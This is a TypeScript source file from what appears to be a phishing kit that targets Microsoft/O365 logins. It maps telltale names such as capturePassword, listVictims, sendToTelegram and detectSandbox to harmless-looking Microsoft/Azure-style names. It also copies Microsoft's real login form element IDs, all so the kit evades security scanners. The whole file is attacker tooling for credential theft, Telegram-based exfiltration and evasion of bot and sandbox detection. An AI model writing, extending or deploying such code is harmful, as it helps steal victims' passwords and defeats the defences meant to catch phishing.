/**
 * STEALTH NAMING DICTIONARY
 * 
 * This file maps suspicious names to legitimate-looking alternatives
 * DO NOT delete this file - it's your Rosetta Stone for debugging
 * 
 * Convention: Use Microsoft/Azure/O365 terminology to blend in
 */

export const NAMING_MAP = {
  // ============================================
  // API ROUTES (Most Critical - Scanners Check These First)
  // ============================================
  apiRoutes: {
    // OLD: '/api/submit-credentials'
    submitCredentials: '/api/auth/session/validate',
    
    // OLD: '/api/verify-captcha'
    verifyCaptcha: '/api/security/challenge/verify',
    
    // OLD: '/api/bot-filter'
    botFilter: '/api/health/diagnostics',
    
    // OLD: '/api/admin/links'
    adminLinks: '/api/management/tokens',
    
    // OLD: '/api/telegram/notify'
    telegramNotify: '/api/audit/events/log',
    
    // Additional routes found in codebase
    honeypotTriggered: '/api/analytics/events',
    scannerRedirect: '/api/redirect/handler',
    stealthVerification: '/api/security/verify',
    checkLinkStatus: '/api/management/link-status',
    getEmail: '/api/identity/resolve',
    getEmailFromToken: '/api/identity/token-resolve',
    checkFingerprint: '/api/security/fingerprint',
    checkLinkUsage: '/api/management/usage',
    sandboxCheck: '/api/health/environment',
    internalLogVisitor: '/api/analytics/visitor',
    internalSendBotNotification: '/api/analytics/security-event',
  },

  // ============================================
  // FUNCTION NAMES (Critical - Visible in compiled code)
  // ============================================
  functions: {
    // Credential Handling
    submitCredentials: 'processAuthenticationRequest',
    capturePassword: 'validateCredentials',
    storeCredentials: 'persistSessionData',
    sendCredentials: 'syncAuthenticationState',
    
    // Token Management
    generatePhishingToken: 'createSessionToken',
    verifyPhishingToken: 'validateSessionToken',
    encodeToken: 'encodeSessionIdentifier',
    
    // Bot Detection
    detectBot: 'validateRequestOrigin',
    checkScanner: 'verifyClientAuthenticity',
    isSuspicious: 'assessRequestRisk',
    blockBot: 'enforceAccessPolicy',
    detectSandbox: 'analyzeEnvironment',
    detectScanner: 'classifyRequest',
    
    // Telegram Integration
    sendToTelegram: 'logAuditEvent',
    notifyTelegram: 'recordSecurityEvent',
    telegramWebhook: 'auditEventWebhook',
    
    // Admin Functions
    generatePhishingLink: 'createAuthenticationLink',
    getPhishingStats: 'getSessionMetrics',
    listVictims: 'listAuthenticatedUsers',
    
    // Honeypot/Stealth
    honeypotTriggered: 'anomalyDetected',
    isHoneypotTriggered: 'isAnomalyDetected',
    recordDetectionEvent: 'recordTelemetryEvent',
    getRandomSafeRedirect: 'getDefaultRedirectUrl',
  },

  // ============================================
  // VARIABLE NAMES (Visible in Network Requests)
  // ============================================
  variables: {
    // Credentials
    phishingToken: 'sessionToken',
    victimEmail: 'userPrincipalName',
    victimPassword: 'userCredential',
    capturedCredentials: 'authenticatedSessions',
    
    // Configuration
    telegramBotToken: 'auditServiceToken',
    telegramChatId: 'auditChannelId',
    phishingDomain: 'authenticationDomain',
    
    // Storage
    credentialsFile: 'sessionsCache',
    fingerprintsFile: 'clientFingerprints',
    attemptsCache: 'authenticationAttempts',
  },

  // ============================================
  // CSS CLASS NAMES (Visible in HTML Source)
  // ============================================
  classes: {
    // Forms
    'credential-form': 'identity-signin-form',
    'phishing-container': 'auth-container',
    'submit-button': 'sign-in-button',
    'password-input': 'identity-textbox',
    
    // Admin Panel
    'admin-panel': 'management-console',
    'victim-list': 'session-registry',
    'stats-dashboard': 'analytics-overview',
  },

  // ============================================
  // HTML IDs (Scanners Check Against Real O365)
  // ============================================
  ids: {
    // Match Real Microsoft Login IDs
    emailInput: 'i0116',        // Microsoft's actual email input ID
    passwordInput: 'i0118',     // Microsoft's actual password input ID
    submitButton: 'idSIButton9', // Microsoft's actual submit button ID
    errorDisplay: 'passwordError', // Microsoft's actual error display ID
    loginForm: 'i0281',         // Microsoft's actual form ID
  },

  // ============================================
  // FILE NAMES (Visible in Network Tab)
  // ============================================
  files: {
    '.captured-credentials.json': '.session-cache.json',
    '.fingerprints.json': '.client-metadata.json',
    '.attempts-cache.json': '.auth-attempts.json',
    '.admin-settings.json': '.config-cache.json',
    '.visitor-logs.json': '.access-logs.json',
    '.links.json': '.tokens.json',
    '.captured-emails.json': '.sessions.json',
  },

  // ============================================
  // ENVIRONMENT VARIABLES (Used in .env files)
  // ============================================
  envVars: {
    TELEGRAM_BOT_TOKEN: 'AUDIT_SERVICE_TOKEN',
    TELEGRAM_CHAT_ID: 'AUDIT_CHANNEL_ID',
    TOKEN_SECRET: 'SESSION_SIGNING_KEY',
    PHISHING_DOMAIN: 'AUTH_DOMAIN',
  },
} as const;

/**
 * Type-safe getter functions
 * Use these in your code instead of hardcoding names
 */
export const getApiRoute = (key: keyof typeof NAMING_MAP.apiRoutes) => {
  return NAMING_MAP.apiRoutes[key];
};

export const getFunctionName = (key: keyof typeof NAMING_MAP.functions) => {
  return NAMING_MAP.functions[key];
};

export const getClassName = (key: keyof typeof NAMING_MAP.classes) => {
  return NAMING_MAP.classes[key];
};

export const getEnvVar = (key: keyof typeof NAMING_MAP.envVars) => {
  return process.env[NAMING_MAP.envVars[key]];
};

// Export for admin panel to use real names internally
export const INTERNAL_NAMES = {
  // Keep original names for internal use only
  credentialCollection: 'credentials',
  sessionTracking: 'sessions',
  // These should NEVER appear in client-side code
};

/**
 * Quick reference for variable renames
 * Use this when refactoring to ensure consistency
 */
export const VARIABLE_RENAME_GUIDE = {
  // Tokens & Auth
  'phishingToken': 'sessionToken',
  'phishingLink': 'authenticationLink',
  'linkToken': 'sessionIdentifier',
  
  // User data
  'victimEmail': 'userPrincipalName',
  'victimPassword': 'userCredential',
  'victim': 'user',
  
  // Credentials
  'capturedCredentials': 'authenticatedSessions',
  'capturedEmails': 'validatedAccounts',
  'credentials': 'sessionData',
  
  // Telegram
  'telegramBotToken': 'auditServiceToken',
  'telegramChatId': 'auditChannelId',
  'telegram': 'auditService',
  
  // Files
  'credentialsFile': 'sessionsCache',
  'fingerprintsFile': 'clientMetadata',
  'attemptsCache': 'authenticationAttempts',
  
  // Phishing-related
  'phishing': 'authentication',
  'phish': 'auth',
  'fake': 'proxy',
  'decoy': 'alternative',
} as const;


